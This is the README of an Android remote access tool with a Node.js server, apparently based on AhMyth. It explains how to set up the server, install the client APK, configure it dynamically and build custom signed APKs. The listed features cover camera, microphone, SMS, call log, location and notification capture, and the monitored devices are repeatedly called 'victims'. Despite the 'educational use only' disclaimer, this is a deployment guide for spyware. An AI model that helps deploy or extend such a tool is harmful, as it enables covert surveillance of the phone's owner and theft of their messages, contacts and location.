# RAT Custod - Remote Administration Tool

## Overview

RAT Custod is a remote administration tool consisting of an Android client and a Node.js server. The system allows remote management and monitoring of Android devices.

## Features

- Remote device management
- Socket.IO-based real-time communication
- Dynamic server configuration (NEW!)
- Notification monitoring
- File management
- Location tracking
- Camera and microphone access
- SMS and call log access
- Contact management

## Quick Start

### Server Setup

1. Navigate to the server directory:
   ```bash
   cd rat-Server
   ```

2. Install dependencies:
   ```bash
   npm install
   ```

3. Configure server settings in `config.json`:
   ```json
   {
     "SERVER_IP": "192.168.1.68",
     "SERVER_PORT": 8000
   }
   ```

4. Start the server:
   ```bash
   node server.js
   ```

   The server will start on port 3000 (configurable via PORT environment variable)

### Client Setup

1. Build the Android APK or use the pre-built APK from the `dist` folder

2. Install on Android device:
   ```bash
   adb install path/to/app.apk
   ```

3. Grant required permissions when prompted

4. The client will automatically:
   - Fetch configuration from server at `http://<SERVER_IP>:3000/api/config`
   - Connect to the server using the configured IP and port
   - Start background service for remote management

## Dynamic Configuration

Starting with this version, the client supports **dynamic configuration**. This means you can change the server IP and port without rebuilding the APK.

### How It Works

1. The server hosts a `/api/config` endpoint that serves configuration
2. When the client starts, it fetches configuration from this endpoint
3. If the endpoint is unavailable, it falls back to the values in AndroidManifest.xml

### Changing Server Configuration

Simply edit `rat-Server/config.json`:

```json
{
  "SERVER_IP": "10.0.0.50",
  "SERVER_PORT": 9000
}
```

All new client connections will automatically use the updated configuration.

For detailed information, see [DYNAMIC_CONFIG.md](DYNAMIC_CONFIG.md)

## Building Custom APK

To build a custom APK with specific server configuration:

1. Use the server's build endpoint:
   ```bash
   POST /api/build
   Content-Type: application/json

   {
     "projectDir": "/path/to/rat-Client",
     "outputName": "custom-app",
     "keystorePath": "/path/to/keystore.jks",
     "keystorePassword": "password",
     "keyAlias": "key0",
     "keyPassword": "password",
     "serverIp": "192.168.1.68",
     "serverPort": 8000
   }
   ```

2. The built APK will be available in the `rat-Server/app/dist` folder

## Architecture

### Server (Node.js + Express + Socket.IO)

- **Main Server**: Runs on port 3000, serves UI and API endpoints
- **Dynamic Victim Listeners**: Creates separate Socket.IO servers for each connected device
- **Configuration API**: Serves dynamic configuration at `/api/config`
- **Build API**: Automates APK building with custom configurations

### Client (Android)

- **MainService**: Background service that manages the connection
- **IOSocket**: Handles Socket.IO communication with server
- **Managers**: Specialized modules for different device functions (Camera, Mic, SMS, etc.)
- **Dynamic Config**: Fetches configuration at startup from server

## Configuration Files

### Server Configuration

**File**: `rat-Server/config.json`
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

### Client Configuration (Fallback)

**File**: `rat-Client/app/src/main/AndroidManifest.xml`
```xml
<meta-data android:name="SERVER_IP"   android:value="192.168.1.68" />
<meta-data android:name="SERVER_PORT" android:value="8000" />
```

## API Endpoints

### Configuration Endpoint

**GET** `/api/config`

Returns current server configuration:
```json
{
  "SERVER_IP": "192.168.1.68",
  "SERVER_PORT": 8000
}
```

### Build Endpoint

**POST** `/api/build`

Builds a custom APK with specified configuration. See server documentation for details.

### Notifications Endpoint

**GET** `/api/notifications/:victim`

Returns notification history for a specific victim device.

## Development

### Prerequisites

- Node.js 14+ 
- Android SDK (for building client)
- Java JDK 8+
- Gradle 7.0+

### Project Structure

```
rat_custod/
├── rat-Server/         # Node.js server
│   ├── server.js       # Main server file
│   ├── config.json     # Dynamic configuration
│   ├── app/            # Server UI application
│   └── package.json    # Dependencies
├── rat-Client/         # Android client
│   ├── app/            # Android app source
│   │   └── src/main/
│   │       └── java/ahmyth/mine/king/ahmyth/
│   │           ├── MainService.java
│   │           ├── IOSocket.java
│   │           └── ... (other managers)
│   └── build.gradle    # Android build config
└── DYNAMIC_CONFIG.md   # Configuration documentation
```

## Security Notes

⚠️ **Important**: This tool is intended for educational and authorized use only.

- The `/api/config` endpoint is unauthenticated
- Communication uses cleartext HTTP (not HTTPS)
- Requires extensive Android permissions
- Should only be used on devices you own or have explicit permission to manage

## Troubleshooting

### Client can't connect to server

1. Verify server is running: `curl http://<SERVER_IP>:3000/api/config`
2. Check network connectivity between client and server
3. Verify firewall allows ports 3000 and configured SERVER_PORT
4. Check Android logs: `adb logcat | grep AhMyth`

### Config endpoint not responding

1. Verify `config.json` exists in rat-Server directory
2. Check JSON syntax is valid
3. Restart the server
4. Check server logs for errors

### APK build fails

1. Verify Android SDK is properly installed
2. Check Java version compatibility (JDK 8-11 recommended)
3. Ensure all dependencies are installed
4. Review Gradle build logs for specific errors

## License

This project is for educational purposes only. Use responsibly and only on devices you own or have explicit permission to manage.

## Contributing

Contributions are welcome! Please ensure any changes:
- Maintain backward compatibility
- Include appropriate documentation
- Follow existing code style
- Are tested on both client and server

## Support

For issues and questions:
- Check the documentation in `DYNAMIC_CONFIG.md`
- Review existing issues on GitHub
- Create a new issue with detailed information about your problem
